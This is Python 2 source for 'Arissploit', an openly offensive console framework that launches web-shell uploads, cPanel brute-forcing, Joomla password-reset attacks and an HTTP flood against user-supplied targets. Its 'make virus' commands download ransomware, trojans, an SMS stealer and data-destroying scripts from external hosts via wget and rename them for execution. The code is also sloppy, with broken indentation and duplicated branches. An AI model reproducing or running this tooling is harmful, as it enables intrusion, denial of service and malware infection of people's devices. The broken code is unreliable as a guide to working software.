#!/usr/bin/env python

 # Arissploit Framework - database of exploits, viruses, etc.
 # Copyright (C) 2019 Entynetproject <Ivan Nikolsky>
 #

 # Modified BSD License
 #
 #        Redistribution and use in source and binary
 # forms, with or without modification, are permitted
 # provided that the following conditions are met:
 #
 # 1. Redistributions of source code must retain the
 #    above copyright notice, this list of conditions
 #    and the following disclaimer.
 # 2. Redistributions in binary form must reproduce the
 #    above copyright notice, this list of conditions
 #    and the following disclaimer in the documentation
 #    and/or other materials provided with the
 #    distribution.
 # 3. The name of the author may not be used to endorse
 #    or promote products derived from this software
 #    without specific prior written permission.
 #
 # THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS''
 # AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING,
 # BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 # MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 # ARE DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE
 # LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 # EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 # NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 # SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 # INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 # LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 # TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
 # ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 # ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import os
import time
import sys
import random
import os as sistema
# Set color
R = '\033[31m' # Red
N = '\033[1;37m' # White
G = '\033[32m' # Green
O = '\033[0;33m' # Orange
B = '\033[1;34m' #Blue
E = '\033[0m' # End

def show_graphic():
menu = random.randrange(2, 15) 
if menu == 2:
    os.system("python2 banner/banner.py")

if menu == 3:
    os.system("python2 banner/banner1.py")

if menu == 4:
    os.system("python2 banner/banner2.py")

if menu == 5:
    os.system("python2 banner/banner3.py")

if menu == 6:
    os.system("cat banner/banner4.py")

if menu == 7:
    os.system("python2 banner/banner5.py")

show_graphic()
print
print ""+N+"       =[ "+O+"Arissploit v.1 by Entynetproject             "+N+"]"
print "+ -- --=[ 14 Exploits - 10 Scanners 16 post - 38 virus ]"
print "+ -- --=[ Design by DJ Mobley (ascii designer)         "+N+"]"
print "+ -- --=[ Report Bug On Twitter "+R+"@arissploit            "+N+"]"
print
def help():
		print ""+N+""
		print " Global Options"
		print " =============="
		print
		print "  Option Name            Description"
		print "  -------------          ------------------"
		print "  show exploits          Look this exploits"
		print "  show scanners          Look this scanners tools"
		print "  show viruses           Look this viruses name"
		print "  show post              Updated post"
		print "  use exploit/           <exploit name>"
		print "  use scanner/           <scanner name>"
		print "  make virus/            <virus name>"
                print "  update                 Update Arissploit Framework"
                print "  clear                  Clean Arissploit input/output"
                print "  run                    Start attack or build virus"
		print
		main()
def main():
	dr = raw_input("(console)> ")
	if dr == "show options":
		time.sleep(1)
		help()
		main()
        elif dr == "run":
                print ""+N+""+B+"["+R+"-"+B+"] "+N+"No exploit, virus or scanner selected!"+N+""
                print ""+N+""+B+"["+R+"!"+B+"] "+N+"Use it only after selecting a type of attack!"+N+""
                print
                main()
        elif dr == "update":
		print ""+B+"~ "+N+"Updating..."
		time.sleep(3)
		print
		print ""+G+" ARISSPLOIT WAS UPGRADED!"
		time.sleep(1)
		print
		print ""+N+"cloning newly updated..."
		time.sleep(5)
		os.system("rm -r ~/arissploit;git clone https://github.com/entynetproject/arissploit.git;cd arissploit;arissploit")
		main()
	elif dr == "show exploits":
		print ""+N+""
		print " EXPLOITS"
		print " ========"
		print
		print "  Exploit Name                 Rank        Description"
		print "  --------------               -------     -------------"
		print "  php_thumb_shell_upload       good        vulnerability"
		print "  cpanel_bruteforce            normal      vulnerability"
		print "  joomla_com_hdflayer          manual      vulnerability"
		print "  wp_symposium_shell_upload    good        vulnerability"
		print "  joomla0day_com_myngallery    good        vulnerability"
		print "  jm_auto_change_pswd          normal      vulnerability"
		print "  android/remote_access        expert      Remote Acces Administrator (RAT)"
		print "  power_dos                    manual      Denial Of Service"
		print "  joomla_com_foxcontact        high        vulnerability"
		print "  joomla_simple_shell          high        vulnerability"
		print
		main()
	elif dr == "show scanners":
		print ""+N+""
		print " SCANNERS"
		print " ========"
		print
		print "  Scanner Name                   Rank        Description"
		print "  --------------                 -------     -------------"
		print "  joomla_vulnerability_scanners  high        vulnerability"
		print "  joomla_scanners_v.2            good        bug scan"
		print "  joomla_scanners_v3             normal      bug scan"
		print "  jomscan_v4                     good        bug scan"
		print "  joomla_sqli_scanners           high        vulnerability scanners"
		print "  lfi_scanners                   good        lfi bug scan"
		print "  port_scanners                  manual      port scan"
		print "  dir_search                     high        directory webscan"
		print "  wordpress_user_scan            good        get wordpress username"
		print "  cms_war                        high        FULL SCAN ALL WEBSITES"
		print "  usr_pro_wordpress_auto_find    good        find user pro vulnerability"
		print
		main()
	elif dr == "show post":
		print ""+N+""
                print " POST"
                print " ===="
                print
		print "  Post Name                             Date               Description"
		print "  ----------------                      ---------------    -------------"
		print "                                        DECEMBER 2019"
		print "  wordpress_user_scan                   Thu, December 14   scanners"
		print "  dir_search                            Thu, December 14   scanners"
		print "  cms_war                               Fri, December 15   scanners"
		print "  usr_pro_wordpress_auto_find           Sat, December 17   scanners"
		print "  android/remote_access                 Sat, December 17   exploits"
		print "  joomla_com_foxcontact                 Thu, December 17   exploits"
		print "  virus/on_android_andrograve           Fri, December 22   viruses"
		print "  virus/on_android_androrm              Fri, December 22   viruses"
		print "  virus/on_android_androrw              Fri, December 22   viruses"
		print "  virus/on_android_gokernel             Fri, December 22   viruses"
		print "  virus/on_android_gps                  Fri, December 22   viruses"
		print "  virus/on_android_legacy               Fri, December 22   viruses"
		print "  virus/on_android_rans                 Fri, December 22   viruses"
		print "  virus/on_android_rf                   Sat, December 23   viruses"
		print "  virus/on_android_wana_decp            Sat, December 23   viruses"
		print "  virus/on_android_wanadecryptor2       Sat, December 23   viruses"
		print "  joomla_simple_shell                   Thu, December 26   exploits"
		print "  virus/on_android_dangerous_malware    Sat, December 28   viruses"
		print "  virus/on_android_malware              Sat, December 28   viruses"
		print "  virus/on_android_malware_enc          Sat, December 28   viruses"
		print "  virus/on_android_malware_door         Sat, December 28   viruses"
		print "  virus/on_android_malware_at           Sat, December 28   viruses"
		print "  virus/on_android_trojan_malware       Sat, December 28   viruses"
		print "  virus/on_android_brother              Sat, December 28   viruses"
		print "  virus/on_android_mcef                 Sat, December 28   viruses"
		print "  virus/on_android_sms_tief             Sat, December 28   viruses"
		print
		main()
	elif dr == "clear":
		os.system("clear")
		main()
	elif dr == "show viruses":
			print ""+N+""
			print " VIRUSES"
			print " ======="
			print
			print "  Virus Name                           Rank        Description"
			print "  ------------                         -------     -------------"
			print "  virus/on_android                     high        Make bootloop"
			print "  virus/on_windows_cut                 high        Cut the victim's network"
			print "  virus/on_windows_alay                normal      Make the victim's keyboard so alay"
			print "  virus/on_android_zip                 manual      Zipbomb"
			print "  virus/on_android_boot                normal      Make bootlop"
			print "  virus/on_windows_caps                low         Make Caps Lock key keeps on alive"
			print "  virus/on_android_dea                 manual      Data eater"
			print "  virus/on_windows_cmd                 normal      CMD open"
			print "  virus/on_windows_dea                 normal      Data eater"
			print "  virus/on_android_frz                 normal      Make freeze"
			print "  virus/on_windows_ugly                low         Have no explanation"
			print "  virus/on_windows_dat                 high        Data eater"
			print "  virus/on_windows_quiz                normal      Display a quiz on the victim's"
			print "  virus/on_macosx_nthg                 normal      -"
			print "  virus/on_macosx_trnd                 normal      TRINOIDS!"
			print "  virus/on_windows_rip                 high        DEAD!"
			print "  virus/on_android_andrograve          expert      ransomware"
			print "  virus/on_android_androrm             high        ransomware zip virus"
			print "  virus/on_android_androrw             expert      ransomware"
			print "  virus/on_android_gokernel            powerful    ransomware"
			print "  virus/on_android_gps                 powerful    ransomware gps manipulation"
			print "  virus/on_android_legacy              normal      nothing xd"
			print "  virus/on_windows_broken              high        malware"
			print "  virus/on_android_rans                expert      ransomware"
			print "  virus/on_android_rf                  manual      nothing"
			print "  virus/on_android_wana_decp           good        wanna decryptor"
			print "  virus/on_android_wanadecryptor2      good        wanna decryptor v2"
			print "  virus/on_android_dangerous_malware   high        malware"
			print "  virus/on_android_malware             high        malware"
			print "  virus/on_android_malware_enc         good        malware"
			print "  virus/on_android_malware_door        high        trojan"
			print "  virus/on_android_malware_at          high        malware"
			print "  virus/on_android_trojan_malware      good        malware"
			print "  virus/on_android_brother             manual      malware"
			print "  virus/on_android_mcef                manual      malware"
			print "  virus/on_android_sms_tief            manual      malware"
			print
			main()
			
			
			##############
			#     EXPLOITS     #
			##############
			
			
	elif dr == "use exploit/android/remote_access":
		print ""+N+"=>"+R+" Now you can enter key 'show options'"
		os.system("cd modules;cd android;python2 android.py")
		print ""+B+"[*] "+N+"Job finished..."
		print
		main()
	elif dr == "use exploit/power_dos":
		target = raw_input(""+N+"(target)> ("+R+"power_dos"+N+"): ")
		print "target =>"+R+"",target
		run = raw_input(""+N+"(console)> ("+R+"power_dos"+N+"): ")
		if run == "run":
			os.system("cd modules;cd hulk_attacks;python2 hulk.py %s" % (target))
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "use exploit/php_thumb_shell_upload":
		list = raw_input(""+N+"(target)> ("+R+"php_thumb_shell_upload"+N+"): ")
		time.sleep(1)
		print "target =>"+R+"",list
		go = raw_input(""+N+"(console)> ("+R+"php_thumb_shell_upload"+N+"): ")
		if go == "run":
			time.sleep(2)
			print ""+B+"[*] "+N+"Starting attacks..."
			os.system("cd modules;cd exploit_phpthumb;perl rcexploit.pl %s" % (list))
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "use exploit/cpanel_bruteforce":
		vc = raw_input(""+N+"(target)> ("+R+"cpanel_bruteforce"+N+"): ")
		time.sleep(1)
		print "target => "+R+"",vc
		usr = raw_input(""+N+"(SET user)> ")
		time.sleep(1)
		print "username = >"+R+"",usr
		port = raw_input(""+N+"(SET lport)> ")
		time.sleep(1)
		print "LPORT = > "+R+"",port
		pss = raw_input(""+N+"(SET list)>")
		time.sleep(1)
		print "list =>"+R+"",pss
		pas = raw_input(""+N+"(SET savepass)> ")
		time.sleep(1)
		print "save on => "+R+"",pas
		god = raw_input(""+N+"(console)> ("+R+"cpanel_bruteforce"+N+"): ")
		if god == "run":
			time.sleep(2)
			print ""+B+"[*] "+N+"Starting attacks..."
			os.system("cd modules;cd cpanel;perl cpanel.pl %s %s %s %s %s" % (vc,usr,port,pss,pas))
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "use exploit/joomla_com_hdflayer":
		t = raw_input(""+N+"(target)> ("+R+"joomla_com_hdflayer"+N+"): ")
		time.sleep(1)
		print "target => "+R+"",t
		f = raw_input(""+N+"(SET shellock)> ")
		time.sleep(1)
		print "target => "+R+"",f
		r = raw_input(""+N+"(console)> ("+R+"joomla_com_hdflayer"+N+"): ")
		time.sleep(1)
		if r == "run":
			print ""+B+"[*] "+N+"Starting attacks..."
			os.system("cd  modules;cd exploit_joomla;python2 exploitjoomla.py -t %s -f %s" % (t,f))
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "use exploit/wp_symposium_shell_upload":
		vc = raw_input(""+N+"(target)> ("+R+"wp_symposium_shell_upload"+N+"): ")
		time.sleep(1)
		print "target => "+R+"",vc
		fl = raw_input(""+N+"(SET shellock)> ")
		time.sleep(1)
		print "shell location = > "+R+"",fl
		ru = raw_input(""+N+"(console)> ("+R+"wp_symposium_shell_upload"+N+"): ")
		time.sleep(2)
		if ru == "run":
			print ""+B+"[*] "+N+"Starting attacks..."
			os.system("cd modules;cd prestashop;python2 wp-symposium.py -t %s -f %s" % (vc,fl))
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "use exploit/jm_auto_change_pswd":
		er = raw_input(""+N+"(target)> ("+R+"jm_auto_change_pswd"+N+"): ")
		time.sleep(1)
		print "target =>"+R+"",er
		pa = raw_input(""+N+"(SET newpass)> ")
		time.sleep(1)
		print "new pass => "+R+"",pa
		y = raw_input(""+N+"(console)> ("+R+"jm_auto_change_pswd"+N+"): ")
		time.sleep(2)
		if y == "run":
			print ""+B+"[*] "+N+"Starting attacks..."
			os.system("cd modules;cd autoriset_joomla0day;perl joomlariset.pl %s %s" % (er,pa))
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "use exploit/joomla_com_foxcontact":
		ts = raw_input(""+N+"(target)> ("+R+"joomla_com_foxcontact"+N+"): ")
		print "target => "+R+"",ts
		time.sleep(1)
		print ""+N+"=>"+N+" id?"+R+" example.com/index.php?option=com_foxcontact&view=foxcontact&Itemid="+G+"161 "+R+"<="
		cid = raw_input(""+N+"(CID)> ("+R+"joomla_com_foxcontact"+N+"): ")
		time.sleep(1)
		print "CID => "+R+"",cid
		kt = raw_input(""+N+"(console)> ("+R+"joomla_com_foxcontact"+N+"): ")
		if kt == "run":
			time.sleep(1)
			print ""+B+"["+R+"*"+B+"]"+N+" Starting attacks..."
			os.system("cd modules;cd com_foxcontact;python2 exploit.py --url %s --cid %s" % (ts,cid))
			print ""+B+"[*]"+N+" Job finished..."
			print
			main()
	elif dr == "use exploit/joomla0day_com_myngallery":
		ft = raw_input(""+N+"(target)> ("+R+"joomla0day_com_myngallery"+N+"): ")
		print "target =>"+R+"",ft
		gr = raw_input(""+N+"(console)> ("+R+"joomla0day_com_myngallery"+N+"): ")
		if gr == "run":
			time.sleep(1)
			print ""+B+"[*] "+N+"Starting attacks..."
			os.system("cd modules;cd jom0;perl 0day.pl %s" % (ft))
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "use exploit/joomla_simple_shell":
		os.system("cd modules;cd joomla_ex;python2 joomla.py")
		print ""+B+"[*]"+N+" Job finished"
		print
		main()
			
			
			
			
			#############
			#       VIRUS       #
			#############
			
			
			
	elif dr == "make virus/on_android":
		android = raw_input(""+N+"(console)> ("+R+"on_android"+N+"): ")
		if android == "run":
			time.sleep(1)
			print
			print ""+B+"[*] "+N+"Downloading virus.."
			time.sleep(1)
			os.system("cd virus;mkdir elite;cd elite;wget http://zumizec-com.waper.co/files/elite.apk")
			print
			print "Now check folder Virus on "+R+"arissploit/virus/elite/"+N+""
			print ""+B+"[*]"+N+" Job finished..."
			print
			main()
	elif dr == "make virus/on_windows_rip":
		rip = raw_input(""+N+"(console)> ("+R+"on_windows_rip"+N+"): ")
		if rip == "run":
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir RIP;cd RIP;wget http://zumizec-com.waper.co/files/rip.txt;mv rip.txt RIP.bat")
			print
			print "Now check folder virus on "+R+"arissploit/virus/RIP/"
			print ""+B+"[*]"+N+" Job finished..."
			main()
	elif dr == "make virus/on_windows_cut":
			gl = raw_input(""+N+"(console)> ("+R+"on_windows_cut"+N+"): ")
			if gl == "run":
				print ""+B+"[*]"+N+"Downloading virus..."
				os.system("cd virus;mkdir cut;cd cut;wget http://zumizec-com.waper.co/files/cut.txt;mv cut.txt cut.bat")
				print
				print "Now check folder virus on "+R+"arissploit/virus/cut/"
				time.sleep(1)
				print ""+B+"[*]"+N+" Job finished..."
				print
				main()
	elif dr == "make virus/on_macosx_trnd":
		trnd = raw_input(""+N+"(console)> ("+R+"on_macosx_trnd"+N+"): ")
		if trnd == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir TRINOIDS;cd TRINOIDS;wget http://zumizec-com.waper.co/files/trinoids.txt;mv trinoids.txt trinoids.app")
			print
			print "Now check folder virus on "+R+"arissploit/virus/TRINOIDS/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished..."
			print
			main()
	elif dr == "make virus/on_macosx_nthg":
		nthg = raw_input(""+N+"(console)> ("+R+"on_macosx_nthg"+N+"): ")
		if nthg == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir NOTHING;cd NOTHING;wget http://zumizec-com.waper.co/files/nothing.txt;mv nothing.txt NOTHING.app")
			print
			print "Now check folder virus on "+R+"arissploit/virus/NOTHING/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished..."
			print
			main()
	elif dr == "make virus/on_windows_alay":
		te = raw_input(""+N+"(console)> ("+R+"on_windows_alay"+N+"): ")
		if te == "run":
			print ""+B+"[*]"+N+" Downloading virus..."
			time.sleep(1)
			os.system("cd virus;mkdir alay;cd alay;wget http://zumizec-com.waper.co/files/alay.txt;mv alay.txt alay.vbs")
			print
			print "now check folder virus on"+R+" arissploit/virus/alay/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "make virus/on_android_boot":
		opi = raw_input(""+N+"(console)> ("+R+"on_android_boot"+N+"): ")
		if opi == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			time.sleep(1)
			os.system("cd virus;mkdir bootlop;cd bootlop;wget http://zumizec-com.waper.co/files/bootloop.txt;mv bootloop.txt bootloop.sh")
		        print "Now check folder virus on "+R+"arissploit/virus/bootloop/"
		        time.sleep(1)
		        print (""+B+"[*]"+N+" Job finished..")
		        print
		        main()
	elif dr == "make virus/on_android_zip":
		gl = raw_input(""+N+"(console)> ("+R+"on_android_zip"+N+"): ")
		if gl == "run":
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir zipbomb;cd zipbomb;wget http://zumizec-com.waper.co/files/bom-zip.zip")
			time.sleep(1)
			print
			print "Now check folder virus on"+R+" arissploit/virus/zipbomb/"
			print ""+B+"[*]"+N+" Job finished..."
			print
			main()
	elif dr == "make virus/on_windows_caps":
		pio = raw_input(""+N+"(console)> ("+R+"on_windows_caps"+N+"): ")
		if pio == "run":
			time.sleep(1)
		print ""+B+"[*]"+N+" Downloading virus..."
		os.system("cd virus;mkdir capslock;cd capslock;wget http://zumizec-com.waper.co/files/capslock.txt;mv capslock.txt capslock.vbs")
		print
		print "Now check folder virus on"+R+" arissploit/virus/capslock/"
		time.sleep(1)
		print ""+B+"[*]"+N+" Job finished..."
		print
		main()
	elif dr == "make virus/on_windows_quiz":
		quiz = raw_input(""+N+"(console)> ("+R+"on_windows_quiz"+N+"): ")
		if quiz == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir quiz;cd quiz;wget http://zumizec-com.waper.co/files/kuis.txt;mv kuis.txt quiz.bat")
			print
			print "Now check folder virus on "+R+"arissploit/virus/quiz/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished..."
			print
			main()
	elif dr == "make virus/on_windows_dat":
		dats = raw_input(""+N+"(console)> ("+R+"on_windows_dat"+N+"): ")
		if dats == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir windows-dat;cd windows-dat;wget http://zumizec-com.waper.co/files/koce.txt;mv koce.txt koce.bat")
			print
			print "Now check folder virus on "+R+"arissploit/virus/windows-dat/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished..."
			print
			main()
	elif dr == "make virus/on_windows_ugly":
		ugly = raw_input(""+N+"(console)> ("+R+"on_windows_ugly"+N+"): ")
		if ugly == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir ugly;cd ugly;wget http://zumizec-com.waper.co/files/ugly.txt;mv ugly.txt ugly.vbs")
			print
			print "Now check folder virus on "+R+"arissploit/virus/ugly/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished..."
			print
			main()
	elif dr == "make virus/on_android_frz":
		rez = raw_input(""+N+"(console)> ("+R+"on_android_frz"+N+"): ")
		if rez == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir freeze;cd freeze;wget http://zumizec-com.waper.co/files/freeze.apk")
			print
			print "Now check folder virus on"+R+" arissploit/virus/freeze/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished..."
			print
			main()
	elif dr == "make virus/on_windows_dea":
		dead = raw_input(""+N+"(console)> ("+R+"on_windows_dea"+N+"): ")
		if dead == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+"downloading virus..."
			os.system("cd virus;mkdir windows-data-eater;cd windows-data-eater;wget http://zumizec-com.waper.co/files/reg-eater.txt;mv reg-eater.txt reg-eater.bat")
			print
			print "Now check folder virus on "+R+"arissploit/virus/windows-data-eater/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished..."
			print
			main()
	elif dr == "make virus/on_windows_cmd":
		yx = raw_input(""+N+"(console)> ("+R+"on_windows_cmd"+N+"): ")
		if yx == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir cmd;cd cmd;wget http://zumizec-com.waper.co/files/cmd.txt;mv cmd.txt cmd.bat")
			print
			print "Now check folder virus on "+R+"arissploit/virus/cmd/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished..."
			print
			main()
	elif dr == "make virus/on_android_dea":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_dea"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir data-eater;cd data-eater;wget http://zumizec-com.waper.co/files/data-eater.txt;mv data-eater.txt data-eater.sh")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/data-eater/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
			
			#########
			#    NEW     #
			#########
			
	elif dr == "make virus/on_android_andrograve":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_andrograve"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir andrograve;cd andrograve;wget http://loolzec.blogwaper.com/files/andrograve.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/andrograve/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "make virus/on_android_androrm":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_androrm"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir android-ransomware;cd android-ransomware;wget http://loolzec.blogwaper.com/files/androidransomware.zip")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/android-ransomware/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "make virus/on_android_androrw":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_androrw"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir androidrw;cd androidrw;wget http://loolzec.blogwaper.com/files/androrw.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/androidrw/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "make virus/on_android_gokernel":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_gokernel"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir google-kernel;cd google-kernel;wget http://loolzec.blogwaper.com/files/googlekernel.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/google-kernel/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "make virus/on_android_gps":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_gps"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir gps;cd gps;wget http://loolzec.blogwaper.com/files/gps.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/gps/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "make virus/on_android_legacy":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_legacy"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir legacy;cd legacy;wget http://loolzec.blogwaper.com/files/legacy.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/legacy/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "make virus/on_windows_broken":
		dea = raw_input(""+N+"(console)> ("+R+"on_windows_broken"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir broken;cd broken;wget http://loolzec.blogwaper.com/files/love-letter-for-you.txt;mv love-letter-for-you.txt broken.vbs")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/broken/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "make virus/on_android_rans":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_rans"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir rans;cd rans;wget http://loolzec.blogwaper.com/files/rans.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/rans/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "make virus/on_android_rf":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_rf"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir rf;cd rf;wget http://loolzec.blogwaper.com/files/rfrfrfr.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/rf/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "make virus/on_android_wana_decp":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_wana_decp"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir Wannadecryptor;cd Wannadecryptor;wget http://loolzec.blogwaper.com/files/wannadecryptor.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/Wannadecryptor/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "make virus/on_android_wanadecryptor2":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_wanadecryptor2"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir Wannadecryptor2;cd Wannadecryptor2;wget http://loolzec.blogwaper.com/files/wannadecryptor.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/Wannadecryptor2/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "make virus/on_android_dangerous_malware":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_dangerous_malware"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir dangerous-malware;cd dangerous-malware;wget http://loolzec.blogwaper.com/files/y.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/dangerous-malware/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
	elif dr == "make virus/on_android_malware":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_malware"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir malware;cd malware;wget http://loolzec.blogwaper.com/files/b.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/malware/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
			
			
			#NEW#
			
			
	elif dr == "make virus/on_android_dangerous_malware":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_dangerous_malware"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir dangerous-malware;cd dangerous-malware;wget http://loolzec.blogwaper.com/files/y.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/dangerous-malware/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
			
			#
			
			
	elif dr == "make virus/on_android_malware":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_malware"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir malware;cd malware;wget http://loolzec.blogwaper.com/files/b.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/malware/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
			
			#
			
			
	elif dr == "make virus/on_android_malware_enc":
		dea = raw_input(""+N+"(console)> ("+R+"on_android_malware_enc"+N+"): ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir malware_enc;cd malware_enc;wget http://loolzec.blogwaper.com/files/30208552a677cce35d4863d3d85b85.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"arissploit/virus/malware_enc/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
			
			#
			
	elif dr == "make virus/on_android_malware_door":
